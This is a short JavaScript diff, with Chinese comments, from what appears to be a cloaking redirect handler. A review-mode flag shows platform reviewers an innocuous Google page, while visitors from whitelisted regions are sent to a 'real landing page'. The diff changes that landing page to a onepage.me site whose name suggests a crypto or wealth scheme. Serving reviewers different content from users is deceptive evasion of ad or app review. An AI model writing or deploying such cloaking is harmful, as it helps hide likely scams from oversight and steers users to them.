@@ -10,9 +10,9 @@ module.exports = async (req, res) => {
     const IS_REVIEW_MODE = true; 
     
     // 你的真实落地页（用户最终想看到的页面）
-    const MY_LANDING_PAGE = 'https://sites.google.com/view/caifumima-bitepiae/%E9%A6%96%E9%A1%B5?authuser=2';
+    const MY_LANDING_PAGE = 'https://bit-paieters.onepage.me/';
     // 审核页面（谷歌商店）
-    const REVIEW_PAGE = 'https://sites.google.com/';
+    const REVIEW_PAGE = 'https://play.google.com/';
     
     // ★★★ 地区白名单 ★★★
     // 只在审核模式关闭后生效。只有列表中的地区用户会跳转到真实落地页。
